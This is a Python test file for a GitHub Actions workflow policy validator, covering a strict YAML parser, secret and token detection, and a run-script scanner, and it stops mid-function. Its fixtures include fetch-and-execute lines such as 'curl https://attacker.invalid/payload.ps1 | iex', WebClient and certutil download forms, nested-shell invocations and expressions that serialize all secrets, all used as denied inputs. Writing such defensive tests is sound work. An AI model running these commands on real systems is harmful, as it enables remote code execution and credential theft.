from __future__ import annotations

import copy
import json
import pathlib
import sys
import unittest


POLICY_DIR = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(POLICY_DIR))

from policy_lib import (  # noqa: E402
    APPROVED_ACTIONS,
    PolicyError,
    StrictYamlParser,
    exact_equal,
    is_exact_int,
    is_nonnegative_size,
    is_positive_id,
    parse_json_strict,
    parse_workflow_yaml,
    references_github_token,
    references_secret,
    scan_run_script,
    validate_approval_graph,
    validate_workflow_document,
)


MSYS2_SETUP_PIN = "66cd2cce69caa17b53920067426061ca1de3a884"
# msys2/setup-msys2 is deliberately absent from the active allow-list; the
# MSYSTEM restriction is still modeled, so it is exercised against an explicit
# hypothetical allow-list rather than by re-granting dormant authority.
HYPOTHETICAL_ACTIONS = dict(APPROVED_ACTIONS, **{"msys2/setup-msys2": MSYS2_SETUP_PIN})


class PolicyTestCase(unittest.TestCase):
    def assert_policy_error(self, code, function):
        with self.assertRaises(PolicyError) as raised:
            function()
        self.assertEqual(raised.exception.code, code)


class StrictYamlTests(PolicyTestCase):
    def test_literal_run_block_is_semantic_data(self):
        parsed = StrictYamlParser(
            "root:\n"
            "  steps:\n"
            "    - name: safe\n"
            "      run: |\n"
            "        echo first\n"
            "          echo intentionally-indented\n"
        ).parse()
        self.assertEqual(
            parsed["root"]["steps"][0]["run"],
            "echo first\n  echo intentionally-indented\n",
        )

    def test_exact_plain_run_continuation_exploit_is_rejected(self):
        exploit = (
            "jobs:\n"
            "  verify:\n"
            "    steps:\n"
            "      - run: echo admitted\n"
            "          curl https://attacker.invalid/payload.ps1 | iex\n"
        )
        self.assert_policy_error(
            "YAML_PLAIN_CONTINUATION", lambda: StrictYamlParser(exploit).parse()
        )

    def test_more_indented_shell_continuation_exploit_is_rejected(self):
        exploit = (
            "jobs:\n"
            "  verify:\n"
            "    steps:\n"
            "      - run: Write-Output safe\n"
            "            ; Invoke-WebRequest https://attacker.invalid/x\n"
        )
        self.assert_policy_error(
            "YAML_PLAIN_CONTINUATION", lambda: StrictYamlParser(exploit).parse()
        )

    def test_plain_scalar_cannot_gain_a_second_line(self):
        exploit = "run: echo safe\n  whoami\n"
        self.assert_policy_error(
            "YAML_PLAIN_CONTINUATION", lambda: StrictYamlParser(exploit).parse()
        )

    def test_unsupported_yaml_features_fail_closed(self):
        cases = {
            "flow": "items: [one, two]\n",
            "folded": "run: >\n  echo unsafe\n",
            "chomped": "run: |-\n  echo unsafe\n",
            "anchor": "value: &shared unsafe\n",
            "alias": "value: *shared\n",
            "tag": "value: !unsafe payload\n",
            "quoted": 'value: "quoted"\n',
            "directive": "%YAML 1.2\nvalue: x\n",
            "document": "---\nvalue: x\n",
            "comment": "value: x # hidden\n",
            "full-comment": "# hidden\nvalue: x\n",
            "tab": "value:\n\tchild: x\n",
        }
        for label, source in cases.items():
            with self.subTest(label=label):
                with self.assertRaises(PolicyError):
                    StrictYamlParser(source).parse()

    def test_duplicate_keys_fail_closed(self):
        self.assert_policy_error(
            "YAML_DUPLICATE_KEY",
            lambda: StrictYamlParser("value: one\nvalue: two\n").parse(),
        )

    def test_ambiguous_yaml_booleans_fail_closed(self):
        for value in ("yes", "no", "on", "off"):
            with self.subTest(value=value):
                self.assert_policy_error(
                    "YAML_AMBIGUOUS_BOOLEAN",
                    lambda value=value: StrictYamlParser(f"value: {value}\n").parse(),
                )

    def test_indentation_must_be_exactly_two_spaces(self):
        self.assert_policy_error(
            "YAML_INDENT",
            lambda: StrictYamlParser("root:\n   child: value\n").parse(),
        )

    def test_control_characters_reject_before_line_splitting(self):
        cases = {
            "vertical-tab": "\x0b",
            "form-feed": "\x0c",
            "file-separator": "\x1c",
            "group-separator": "\x1d",
            "record-separator": "\x1e",
            "next-line": "\x85",
            "line-separator": "\u2028",
            "paragraph-separator": "\u2029",
            "escape": "\x1b",
            "delete": "\x7f",
            "embedded-bom": "\ufeff",
        }
        for label, character in cases.items():
            source = f"value: safe{character}injected: unsafe\n"
            with self.subTest(label=label):
                self.assert_policy_error(
                    "YAML_CONTROL", lambda source=source: StrictYamlParser(source).parse()
                )

    def test_parser_model_divergence_bytes_are_rejected(self):
        # Python's splitlines() -- like a conforming YAML reader -- treats these
        # as line breaks, while this parser splits only on LF. Any byte where
        # the two models disagree must be rejected instead of silently smuggling
        # a second logical line into one scalar.
        for character in ("\x0b", "\x0c", "\x1c", "\x1d", "\x1e", "\x85", "\u2028", "\u2029"):
            source = f"value: safe{character}injected: unsafe\n"
            with self.subTest(character=repr(character)):
                self.assertGreater(
                    len(source.splitlines()),
                    len(source.split("\n")) - 1,
                    "fixture must actually diverge between the two line models",
                )
                self.assert_policy_error(
                    "YAML_CONTROL", lambda source=source: StrictYamlParser(source).parse()
                )

    def test_permitted_whitespace_still_parses(self):
        parsed = StrictYamlParser("root:\n  child: value\n").parse()
        self.assertEqual(parsed, {"root": {"child": "value"}})


class ExactEqualityTests(PolicyTestCase):
    def test_bool_never_equals_int(self):
        self.assertFalse(exact_equal(True, 1))
        self.assertFalse(exact_equal(1, True))
        self.assertFalse(exact_equal(False, 0))
        self.assertFalse(exact_equal(0, False))

    def test_nested_scalar_types_are_exact(self):
        self.assertFalse(exact_equal({"a": [1]}, {"a": [True]}))
        self.assertFalse(exact_equal({"a": {"b": 0}}, {"a": {"b": False}}))
        self.assertFalse(exact_equal([1, 2], [1, 2, 3]))
        self.assertFalse(exact_equal({"a": 1}, {"a": 1, "b": 2}))
        self.assertFalse(exact_equal({"a": 1}, {"b": 1}))
        self.assertTrue(exact_equal({"a": [1, {"b": False}]}, {"a": [1, {"b": False}]}))

    def test_float_and_int_do_not_conflate(self):
        self.assertFalse(exact_equal(1, 1.0))
        self.assertFalse(exact_equal(1.0, 1))


class SecretExpressionTests(PolicyTestCase):
    def test_secret_variants_are_detected(self):
        cases = (
            "${{ secrets.DEPLOY_TOKEN }}",
            "${{secrets.DEPLOY_TOKEN}}",
            "${{   secrets   .   DEPLOY_TOKEN   }}",
            "${{ SECRETS.DEPLOY_TOKEN }}",
            "${{ Secrets.Deploy_Token }}",
            "Bearer ${{ secrets.DEPLOY_TOKEN }} trailing",
            "prefix${{secrets.A}}suffix",
            "${{ secrets['DEPLOY_TOKEN'] }}",
            '${{ secrets["DEPLOY_TOKEN"] }}',
            "${{ fromJSON(secrets.BLOB).value }}",
            "${{ secrets.\n  DEPLOY_TOKEN }}",
            "${{ secrets.UNTERMINATED",
        )
        for value in cases:
            with self.subTest(value=value):
                self.assertTrue(references_secret(value), value)
                self.assertTrue(references_secret({"env": {"X": value}}), value)
                self.assertTrue(references_secret(["a", ["b", value]]), value)

    def test_secret_near_misses_do_not_fire(self):
        cases = (
            "no secrets here",
            "the step handles secrets.",
            "${{ github.event.number }}",
            "${{ mysecrets.VALUE }}",
            "${{ secrets_map.VALUE }}",
            "${{ github.secrets }}",
            "secrets.DEPLOY_TOKEN",
            "${{ notsecrets['X'] }}",
        )
        for value in cases:
            with self.subTest(value=value):
                self.assertFalse(references_secret(value), value)

    def test_function_indirected_secret_expressions_are_detected(self):
        cases = (
            "${{ toJSON(secrets) }}",
            "${{ toJson(secrets) }}",
            "${{ fromJSON(toJSON(secrets)).DEPLOY_TOKEN }}",
            "${{ format('{0}', toJSON(secrets)) }}",
            "${{ join(secrets, ',') }}",
            "${{ toJSON( secrets ) }}",
            "${{ TOJSON(SECRETS) }}",
        )
        for value in cases:
            with self.subTest(value=value):
                self.assertTrue(references_secret(value), value)


class GithubTokenExpressionTests(PolicyTestCase):
    def test_token_variants_are_detected(self):
        cases = (
            "${{ github.token }}",
            "${{github.token}}",
            "${{   github   .   token   }}",
            "${{ GITHUB.TOKEN }}",
            "${{ GitHub.Token }}",
            "Bearer ${{ github.token }}",
            "prefix${{github.token}}suffix",
            "${{ github['token'] }}",
            '${{ github["token"] }}',
            "${{ format('{0}', github.token) }}",
            "${{ github.token",
        )
        for value in cases:
            with self.subTest(value=value):
                self.assertTrue(references_github_token(value), value)
                self.assertTrue(references_github_token({"X": value}), value)

    def test_token_near_misses_do_not_fire(self):
        cases = (
            "${{ github.event.number }}",
            "${{ mygithub.token }}",
            "${{ github.token_name }}",
            "${{ github_token }}",
            "github.token",
            "a token for github",
            "${{ github.repository }}",
            "${{ github.api_url }}",
            "${{ github.repository_id }}",
            "${{ github.run_id }}",
            "${{ github.run_attempt }}",
            "${{ github.job }}",
            "${{ github.event.pull_request.base.sha }}",
        )
        for value in cases:
            with self.subTest(value=value):
                self.assertFalse(references_github_token(value), value)

    def test_whole_context_serialization_exposes_the_token(self):
        cases = (
            "${{ toJSON(github) }}",
            "${{ toJson( github ) }}",
            "${{ fromJSON(toJSON(github)).token }}",
            "${{ format('{0}', github) }}",
            "${{ TOJSON(GITHUB) }}",
        )
        for value in cases:
            with self.subTest(value=value):
                self.assertTrue(references_github_token(value), value)

    def test_conservation_holds_for_indirected_forms(self):
        from policy_lib import count_github_token_references

        document = {"env": {"A": "${{ toJSON(github) }}", "B": "${{ github.token }}"}}
        self.assertEqual(count_github_token_references(document), 2)
        self.assertEqual(
            count_github_token_references(document["env"]),
            count_github_token_references(document),
        )


class WorkflowSemanticTests(PolicyTestCase):
    @classmethod
    def setUpClass(cls):
        cls.graph = json.loads(
            (POLICY_DIR / "approval-graph.json").read_text(encoding="utf-8")
        )
        cls.workflow_path = pathlib.Path(
            next(iter(cls.graph["workflows"]))
        )
        cls.workflow = parse_workflow_yaml(
            (POLICY_DIR.parents[1] / cls.workflow_path).read_text(encoding="utf-8")
        )
        cls.spec = next(iter(cls.graph["workflows"].values()))

    def validate(self, document=None, spec=None, actions=None):
        return validate_workflow_document(
            document or self.workflow,
            spec or self.spec,
            actions or APPROVED_ACTIONS,
        )

    def mutate(self):
        return copy.deepcopy(self.workflow)

    def test_checked_in_workflow_has_only_expected_helpers(self):
        self.assertEqual(
            self.validate(),
            {
                ".github/policy/private-root.ps1",
                ".github/policy/validator.py",
            },
        )

    def test_graph_has_all_exact_approved_action_pins(self):
        validate_approval_graph(self.graph)
        self.assertEqual(self.graph["approved_actions"], APPROVED_ACTIONS)
        for pin in APPROVED_ACTIONS.values():
            self.assertRegex(pin, r"^[0-9a-f]{40}$")

    def test_dedicated_anchor_cannot_reuse_generic_actions_identity(self):
        graph = copy.deepcopy(self.graph)
        graph["repository"]["dedicated_check"]["integration_id"] = 15368
        self.assert_policy_error(
            "GRAPH_CHECK", lambda: validate_approval_graph(graph)
        )

    def test_added_dispatch_call_schedule_pages_deployment_release_events_deny(self):
        for event in (
            "workflow_dispatch",
            "workflow_call",
            "schedule",
            "pages_build",
            "deployment",
            "deployment_status",
            "release",
        ):
            document = self.mutate()
            document["on"][event] = {"types": ["created"]}
            with self.subTest(event=event):
                self.assert_policy_error(
                    "WORKFLOW_EVENT_FORBIDDEN", lambda document=document: self.validate(document)
                )

    def test_pull_request_event_cannot_replace_protected_target_event(self):
        document = self.mutate()
        document["on"]["pull_request"] = document["on"].pop("pull_request_target")
        self.assert_policy_error(
            "WORKFLOW_EVENT_UNMODELED", lambda: self.validate(document)
        )

    def test_allowlisted_event_still_must_match_graph_exactly(self):
        spec = copy.deepcopy(self.spec)
        spec["events"] = []
        spec["event_types"] = {}
        self.assert_policy_error(
            "WORKFLOW_EVENTS", lambda: self.validate(spec=spec)
        )

    def test_arbitrary_event_outside_global_allow_list_denies(self):
        document = self.mutate()
        document["on"] = {"issues": {"types": ["opened"]}}
        spec = copy.deepcopy(self.spec)
        spec["events"] = ["issues"]
        spec["event_types"] = {"issues": ["opened"]}
        self.assert_policy_error(
            "WORKFLOW_EVENT_UNMODELED", lambda: self.validate(document, spec)
        )

    def test_write_or_extra_permissions_deny(self):
        for permission, value in (
            ("contents", "write"),
            ("actions", "read"),
            ("pull-requests", "write"),
            ("pages", "write"),
            ("deployments", "write"),
        ):
            document = self.mutate()
            document["permissions"][permission] = value
            with self.subTest(permission=permission):
                self.assert_policy_error(
                    "WORKFLOW_PERMISSIONS", lambda document=document: self.validate(document)
                )

    def test_secret_reference_denies(self):
        variants = (
            "${{ secrets.DEPLOY_TOKEN }}",
            "${{secrets.DEPLOY_TOKEN}}",
            "${{  SECRETS  .  DEPLOY_TOKEN  }}",
            "Authorization: Bearer ${{ secrets.DEPLOY_TOKEN }}",
            "${{ secrets['DEPLOY_TOKEN'] }}",
        )
        for value in variants:
            document = self.mutate()
            document["jobs"]["verify"]["steps"][2]["env"]["UNSAFE"] = value
            spec = copy.deepcopy(self.spec)
            spec["jobs"]["verify"]["steps"][2]["env"]["UNSAFE"] = value
            with self.subTest(value=value):
                self.assert_policy_error(
                    "WORKFLOW_SECRET",
                    lambda document=document, spec=spec: self.validate(document, spec),
                )

    def test_unmodeled_github_token_denies(self):
        variants = (
            "${{ github.token }}",
            "${{github.token}}",
            "${{  GITHUB  .  TOKEN  }}",
            "Authorization: Bearer ${{ github.token }}",
            "${{ github['token'] }}",
        )
        for value in variants:
            document = self.mutate()
            document["jobs"]["verify"]["steps"][1]["env"]["UNSAFE"] = value
            spec = copy.deepcopy(self.spec)
            spec["jobs"]["verify"]["steps"][1]["env"]["UNSAFE"] = value
            with self.subTest(value=value):
                self.assert_policy_error(
                    "WORKFLOW_TOKEN",
                    lambda document=document, spec=spec: self.validate(document, spec),
                )

    def test_declared_but_unused_token_authority_denies(self):
        document = self.mutate()
        spec = copy.deepcopy(self.spec)
        document["jobs"]["verify"]["steps"][1]["env"]["POLICY_MATRIX"] = "none"
        spec["jobs"]["verify"]["steps"][1]["env"]["POLICY_MATRIX"] = "none"
        spec["jobs"]["verify"]["steps"][1]["github_token"] = True
        self.assert_policy_error(
            "WORKFLOW_TOKEN", lambda: self.validate(document, spec)
        )

    def test_token_outside_a_declared_run_env_denies(self):
        document = self.mutate()
        spec = copy.deepcopy(self.spec)
        document["jobs"]["verify"]["steps"][0]["with"]["token"] = "${{ github.token }}"
        spec["jobs"]["verify"]["steps"][0]["with"]["token"] = "${{ github.token }}"
        self.assert_policy_error(
            "WORKFLOW_TOKEN", lambda: self.validate(document, spec)
        )

    def test_base_branch_allow_list_is_pinned_to_master(self):
        self.assertEqual(
            self.workflow["on"]["pull_request_target"]["branches"], ["master"]
        )
        document = self.mutate()
        spec = copy.deepcopy(self.spec)
        document["on"]["pull_request_target"]["branches"] = ["master", "release"]
        spec["event_branches"]["pull_request_target"] = ["master", "release"]
        self.assert_policy_error(
            "WORKFLOW_EVENT_BRANCHES", lambda: self.validate(document, spec)
        )

    def test_missing_base_branch_allow_list_denies(self):
        document = self.mutate()
        del document["on"]["pull_request_target"]["branches"]
        self.assert_policy_error(
            "WORKFLOW_EVENT_CONFIG", lambda: self.validate(document)
        )

    def test_loose_python_equality_cannot_satisfy_the_graph(self):
        cases = (
            ("fetch-depth", True, 1),
            ("fetch-depth", 1, True),
            ("persist-credentials", 0, False),
            ("clean", 1, True),
        )
        for key, document_value, spec_value in cases:
            document = self.mutate()
            spec = copy.deepcopy(self.spec)
            document["jobs"]["verify"]["steps"][0]["with"][key] = document_value
            spec["jobs"]["verify"]["steps"][0]["with"][key] = spec_value
            with self.subTest(key=key, value=document_value):
                self.assertEqual(document_value, spec_value)
                self.assert_policy_error(
                    "ACTION_INPUT",
                    lambda document=document, spec=spec: self.validate(document, spec),
                )

    def test_loose_equality_cannot_satisfy_permissions_or_types(self):
        document = self.mutate()
        spec = copy.deepcopy(self.spec)
        document["permissions"]["contents"] = "read"
        spec["permissions"] = {"contents": "read", "actions": "read"}
        self.assert_policy_error(
            "WORKFLOW_PERMISSIONS", lambda: self.validate(document, spec)
        )

    def test_step_if_continue_timeout_all_deny(self):
        for key, value in (
            ("if", "${{ always() }}"),
            ("continue-on-error", True),
            ("timeout-minutes", 1),
        ):
            document = self.mutate()
            document["jobs"]["verify"]["steps"][1][key] = value
            with self.subTest(key=key):
                self.assert_policy_error(
                    "WORKFLOW_STEP_FORBIDDEN",
                    lambda document=document: self.validate(document),
                )

    def test_job_if_continue_timeout_container_services_all_deny(self):
        cases = {
            "if": "${{ always() }}",
            "continue-on-error": True,
            "timeout-minutes": 1,
            "container": "ubuntu:latest",
            "services": {"db": {"image": "postgres:latest"}},
        }
        for key, value in cases.items():
            document = self.mutate()
            document["jobs"]["verify"][key] = value
            with self.subTest(key=key):
                self.assert_policy_error(
                    "WORKFLOW_JOB_FORBIDDEN",
                    lambda document=document: self.validate(document),
                )

    def test_checkout_is_exact_first_unconditional_base_checkout(self):
        checkout = self.workflow["jobs"]["verify"]["steps"][0]
        self.assertEqual(
            checkout["uses"],
            "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
        )
        self.assertEqual(
            checkout["with"]["ref"],
            "${{ github.event.pull_request.base.sha }}",
        )
        self.assertIs(checkout["with"]["persist-credentials"], False)
        self.assertNotIn("if", checkout)

    def test_candidate_checkout_ref_denies(self):
        document = self.mutate()
        document["jobs"]["verify"]["steps"][0]["with"]["ref"] = (
            "${{ github.event.pull_request.head.sha }}"
        )
        spec = copy.deepcopy(self.spec)
        spec["jobs"]["verify"]["steps"][0]["with"]["ref"] = document["jobs"][
            "verify"
        ]["steps"][0]["with"]["ref"]
        self.assert_policy_error(
            "CHECKOUT_REF", lambda: self.validate(document, spec)
        )

    def test_unpinned_or_uppercase_action_sha_denies(self):
        for pin in ("v4", APPROVED_ACTIONS["actions/checkout"].upper()):
            document = self.mutate()
            document["jobs"]["verify"]["steps"][0]["uses"] = (
                f"actions/checkout@{pin}"
            )
            with self.subTest(pin=pin):
                self.assert_policy_error(
                    "ACTION_PIN", lambda document=document: self.validate(document)
                )

    def _replace_last_step_with_action(self, uses, inputs):
        document = self.mutate()
        spec = copy.deepcopy(self.spec)
        document["jobs"]["verify"]["steps"][2] = {
            "name": "Delegated action",
            "uses": uses,
            "with": inputs,
        }
        spec["jobs"]["verify"]["steps"][2] = {
            "name": "Delegated action",
            "kind": "action",
            "action": uses.split("@", 1)[0],
            "with": inputs,
        }
        spec["helpers"] = [".github/policy/private-root.ps1"]
        spec["data"] = []
        return document, spec
    def test_local_docker_and_reusable_actions_deny(self):
        cases = (
            ("./.github/actions/local", {}),
            ("docker://alpine:latest", {}),
            (
                "owner/repo/.github/workflows/reusable.yml@"
                "1111111111111111111111111111111111111111",
                {},
            ),
        )
        for uses, inputs in cases:
            document, spec = self._replace_last_step_with_action(uses, inputs)
            with self.subTest(uses=uses):
                with self.assertRaises(PolicyError):
                    self.validate(document, spec)

    def test_mingwarm64_is_rejected_at_mandated_setup_pin(self):
        uses = f"msys2/setup-msys2@{MSYS2_SETUP_PIN}"
        document, spec = self._replace_last_step_with_action(
            uses, {"msystem": "MINGWARM64"}
        )
        self.assert_policy_error(
            "MSYSTEM_UNSUPPORTED",
            lambda: self.validate(document, spec, HYPOTHETICAL_ACTIONS),
        )

    def test_setup_msys2_is_no_longer_preapproved(self):
        uses = f"msys2/setup-msys2@{MSYS2_SETUP_PIN}"
        document, spec = self._replace_last_step_with_action(
            uses, {"msystem": "CLANGARM64"}
        )
        self.assertNotIn("msys2/setup-msys2", APPROVED_ACTIONS)
        self.assert_policy_error(
            "ACTION_UNAPPROVED", lambda: self.validate(document, spec)
        )

    def test_only_actions_with_a_current_workflow_need_are_preapproved(self):
        self.assertEqual(set(APPROVED_ACTIONS), {"actions/checkout"})
        for dormant in (
            "actions/upload-artifact",
            "actions/download-artifact",
            "msys2/setup-msys2",
        ):
            with self.subTest(action=dormant):
                self.assertNotIn(dormant, APPROVED_ACTIONS)
                self.assertNotIn(dormant, self.graph["approved_actions"])

    def test_action_must_match_graph_identity_not_only_inputs(self):
        document = self.mutate()
        spec = copy.deepcopy(self.spec)
        spec["jobs"]["verify"]["steps"][0]["action"] = "actions/upload-artifact"
        self.assert_policy_error(
            "ACTION_GRAPH", lambda: self.validate(document, spec)
        )

    def test_supported_msystem_boundary_is_modeled(self):
        uses = f"msys2/setup-msys2@{MSYS2_SETUP_PIN}"
        document, spec = self._replace_last_step_with_action(
            uses, {"msystem": "CLANGARM64"}
        )
        self.validate(document, spec, HYPOTHETICAL_ACTIONS)

    def test_network_package_git_and_container_commands_deny(self):
        scripts = {
            "network": "curl https://attacker.invalid/x\n",
            "package": "pip install attacker\n",
            "git-fetch": "git fetch origin attacker\n",
            "git-checkout": "git checkout attacker\n",
            "container": "docker run attacker/image\n",
            "dynamic": "Invoke-Expression $candidate\n",
        }
        expected = {
            "network": "NETWORK_EXECUTION",
            "package": "PACKAGE_EXECUTION",
            "git-fetch": "GIT_ACQUISITION",
            "git-checkout": "GIT_ACQUISITION",
            "container": "CONTAINER_EXECUTION",
            "dynamic": "DYNAMIC_EXECUTION",
        }
        for label, script in scripts.items():
            with self.subTest(label=label):
                self.assert_policy_error(
                    expected[label], lambda script=script: scan_run_script(script)
                )


    def test_only_safe_fork_execution_model_is_accepted(self):
        spec = copy.deepcopy(self.spec)
        spec["fork_execution"] = "candidate-shell-with-read-token"
        self.assert_policy_error(
            "WORKFLOW_FORK_MODEL", lambda: self.validate(spec=spec)
        )


class RunScriptScannerTests(PolicyTestCase):
    """Adversarial fixtures for every acquisition form named by the audit."""

    def assert_denied(self, script, code=None):
        with self.assertRaises(PolicyError) as raised:
            scan_run_script(script)
        if code is not None:
            self.assertEqual(raised.exception.code, code)
        return raised.exception

    def test_executable_suffixes_are_normalized(self):
        for command in (
            "curl.exe",
            "CURL.EXE",
            "curl.cmd",
            "curl.bat",
            "wget.exe",
            "C:\\Windows\\System32\\curl.exe",
            "/usr/bin/curl",
        ):
            with self.subTest(command=command):
                self.assert_denied(f"{command} -o out target\n", "NETWORK_EXECUTION")

    def test_package_managers_survive_suffix_and_path_normalization(self):
        for command in ("pip.exe", "npm.cmd", "PACMAN.EXE", "C:\\tools\\choco.exe"):
            with self.subTest(command=command):
                self.assert_denied(f"{command} install thing\n", "PACKAGE_EXECUTION")

    def test_nested_shells_are_denied(self):
        for script in (
            "cmd /c whoami\n",
            "cmd.exe /c whoami\n",
            "CMD /C whoami\n",
            "powershell -c whoami\n",
            "powershell.exe -NoProfile -c whoami\n",
            "pwsh -c whoami\n",
            "PWSH.EXE -Command whoami\n",
            "bash -c whoami\n",
            "sh -c whoami\n",
            "wsl bash\n",
            "sudo whoami\n",
            "Start-Process cmd\n",
            "start-process.exe cmd\n",
            "git rev-parse HEAD; cmd /c whoami\n",
            "git status | cmd /c more\n",
        ):
            with self.subTest(script=script.strip()):
                self.assert_denied(script, "NESTED_SHELL_EXECUTION")

    def test_dynamic_invocation_forms_are_denied(self):
        cases = {
            "script-block": "&{ whoami }\n",
            "script-block-tight": "&{whoami}\n",
            "dynamic-variable-call": "& $payload\n",
            "dynamic-variable-call-spaced": "&   $payload\n",
            "dot-source-variable": ". $payload\n",
            "dot-source-path": ". .\\payload.ps1\n",
            "subexpression-call": "& (Get-Command whoami)\n",
            "command-substitution": "$(whoami)\n",
            "backtick": "whoami `\n",
            "invoke-command": "Invoke-Command -ScriptBlock { whoami }\n",
            "new-object": "New-Object Foo.Bar\n",
            "add-type": "Add-Type -TypeDefinition $source\n",
        }
        for label, script in cases.items():
            with self.subTest(label=label):
                self.assert_denied(script, "DYNAMIC_EXECUTION")

    def test_dotnet_acquisition_surfaces_are_denied(self):
        for script in (
            "$c = New-Object Net.WebClient\n",
            "$c = New-Object System.Net.WebClient\n",
            "[Net.WebClient]::new().DownloadString('x')\n",
            "$h = [System.Net.Http.HttpClient]::new()\n",
            "$c.DownloadFile('a', 'b')\n",
            "Start-BitsTransfer -Source a -Destination b\n",
            "certutil -urlcache -f a b\n",
            "bitsadmin /transfer job a b\n",
            "$x = New-Object -ComObject MSXML2.XMLHTTP\n",
            "[Reflection.Assembly]::Load($bytes)\n",
        ):
            with self.subTest(script=script.strip()):
                self.assert_denied(script)

    def test_unknown_commands_are_not_success_shaped(self):
        for script in (
            "whoami\n",
            "Write-Output hello\n",
            "notepad.exe\n",
            "./attacker\n",
            "\"C:\\tools\\attacker.exe\" run\n",
        ):
            with self.subTest(script=script.strip()):
                self.assert_denied(script, "COMMAND_UNMODELED")

    def test_commands_after_every_delimiter_are_scanned(self):
        for delimiter in (";", "&&", "||", "|", "&", "\n"):
            script = f"git status {delimiter} curl.exe target\n"
            with self.subTest(delimiter=delimiter):
                self.assert_denied(script, "NETWORK_EXECUTION")

    def test_unmodeled_git_subcommand_is_denied(self):
        self.assert_denied("git cat-file -p HEAD\n", "GIT_UNMODELED")
        self.assert_denied("git.exe clone https\n")

    def test_unterminated_quote_is_not_tokenizable(self):
        self.assert_denied("git status \"unterminated\n", "SCRIPT_TOKEN")

    def test_protected_workflow_commands_are_preserved(self):
        private_root = (
            '& "$env:GITHUB_WORKSPACE\\protected-base'
            '\\.github\\policy\\private-root.ps1"\n'
        )
        self.assertEqual(
            scan_run_script(private_root), {".github/policy/private-root.ps1"}
        )
        validate = (
            'python -B "$env:GITHUB_WORKSPACE\\protected-base'
            '\\.github\\policy\\validator.py" collect'
            ' --event "$env:GITHUB_EVENT_PATH"'
            ' --graph "$env:GITHUB_WORKSPACE\\protected-base'
            '\\.github\\policy\\approval-graph.json"'
            ' --base-checkout "$env:GITHUB_WORKSPACE\\protected-base"'
            ' --private-root "$env:POLICY_PRIVATE_ROOT"\n'
        )
        self.assertEqual(
            scan_run_script(validate),
            {".github/policy/validator.py", ".github/policy/approval-graph.json"},
        )
        self.assertEqual(scan_run_script("git rev-parse HEAD\n"), set())

    def test_call_operator_is_not_a_classification_escape_hatch(self):
        # The '&' call operator must not launder a denied command behind a
        # quoted literal target.
        cases = {
            '& "cmd" "/c" "del"\n': "NESTED_SHELL_EXECUTION",
            '& "pwsh" "-c" "Get-Date"\n': "NESTED_SHELL_EXECUTION",
            '& "powershell.exe" "-c" "Get-Date"\n': "NESTED_SHELL_EXECUTION",
            '& "bash" "-lc" "id"\n': "NESTED_SHELL_EXECUTION",
            '& "start-process" "calc"\n': "NESTED_SHELL_EXECUTION",
            '& "npm" "install" "evil"\n': "PACKAGE_EXECUTION",
            '& "pacman" "-S" "malware"\n': "PACKAGE_EXECUTION",
            '& "curl.exe" "-o" "out"\n': "NETWORK_EXECUTION",
            '& "docker" "run" "image"\n': "CONTAINER_EXECUTION",
            '& "New-Object" "Foo.Bar"\n': "DYNAMIC_EXECUTION",
        }
        for script, code in cases.items():
            with self.subTest(script=script.strip()):
                self.assert_denied(script, code)

    def test_call_operator_target_must_be_a_local_policy_helper(self):
        for script in (
            '& "notepad"\n',
            '& "C:\\tools\\attacker.exe"\n',
            '& "$env:GITHUB_WORKSPACE\\protected-base\\build.ps1"\n',
        ):
            with self.subTest(script=script.strip()):
                self.assert_denied(script, "COMMAND_UNMODELED")

    def test_python_cannot_tunnel_module_or_inline_execution(self):
        for script in (
            "python -m pip install evil\n",
            'python -c "import os"\n',
            "python -m http.server\n",
            "python --module pip\n",
            "python - \n",
            # Bundled single-character options: CPython honours -c/-m behind
            # other flags, so an exact-token deny-list would not be enough.
            'python -Bc "import os"\n',
            'python -IBc "import os"\n',
            'python -OOc "import os"\n',
            "python -mpip install evil\n",
            "python -mplatform\n",
            "python -mbase64 -d\n",
            "python -b script.py\n",
            "python -E -c pass\n",
            "python -S script.py\n",
        ):
            with self.subTest(script=script.strip()):
                self.assert_denied(script, "DYNAMIC_EXECUTION")

    def test_python_running_a_literal_helper_is_preserved(self):
        script = (
            'python -B "$env:GITHUB_WORKSPACE\\protected-base'
            '\\.github\\policy\\validator.py" collect\n'
        )
        self.assertEqual(scan_run_script(script), {".github/policy/validator.py"})

    def test_call_operator_target_must_be_a_canonical_anchored_helper(self):
        cases = {
            "bare-name": '& "notepad"\n',
            "drive-absolute": '& "C:\\tools\\attacker.ps1"\n',
            "unc": '& "\\\\server\\share\\attacker.ps1"\n',
            "unc-github": '& "\\\\server\\share\\.github\\policy\\x.ps1"\n',
            "device": '& "\\\\?\\C:\\.github\\policy\\x.ps1"\n',
            "traversal": (
                '& "$env:GITHUB_WORKSPACE\\protected-base'
                '\\.github\\..\\..\\attacker.ps1"\n'
            ),
            "dot-component": (
                '& "$env:GITHUB_WORKSPACE\\protected-base\\.github\\.\\x.ps1"\n'
            ),
            "ads": (
                '& "$env:GITHUB_WORKSPACE\\protected-base'
                '\\.github\\policy\\private-root.ps1:evil"\n'
            ),
            "trailing-dot": (
                '& "$env:GITHUB_WORKSPACE\\protected-base'
                '\\.github\\policy\\private-root.ps1."\n'
            ),
            "interpreter-prefix": (
                '& "cmd /c $env:GITHUB_WORKSPACE\\protected-base'
                '\\.github\\policy\\private-root.ps1"\n'
            ),
            "wrong-anchor": '& "$env:GITHUB_WORKSPACE\\.github\\policy\\x.ps1"\n',
            "substring-anchor": (
                '& "$env:GITHUB_WORKSPACE\\protected-base-evil'
                '\\.github\\policy\\x.ps1"\n'
            ),
            "outside-roots": (
                '& "$env:GITHUB_WORKSPACE\\protected-base\\tools\\x.ps1"\n'
            ),
            "mixed-separators": (
                '& "$env:GITHUB_WORKSPACE\\protected-base/.github\\policy\\x.ps1"\n'
            ),
            "no-file": '& "$env:GITHUB_WORKSPACE\\protected-base\\.github"\n',
        }
        for label, script in cases.items():
            with self.subTest(label=label):
                self.assert_denied(script)

    def test_control_path_cannot_appear_outside_an_anchored_reference(self):
        script = (
            'python -B "$env:GITHUB_WORKSPACE\\protected-base'
            '\\.github\\policy\\validator.py" --note C:\\.github\\policy\\evil.py\n'
        )
        self.assert_denied(script, "COMMAND_UNMODELED")

    def test_canonical_anchored_helper_is_accepted(self):
        script = (
            '& "$env:GITHUB_WORKSPACE\\protected-base'
            '\\.github\\policy\\private-root.ps1"\n'
        )
        self.assertEqual(scan_run_script(script), {".github/policy/private-root.ps1"})

    def test_unapproved_interpolation_in_a_command_target_is_denied(self):
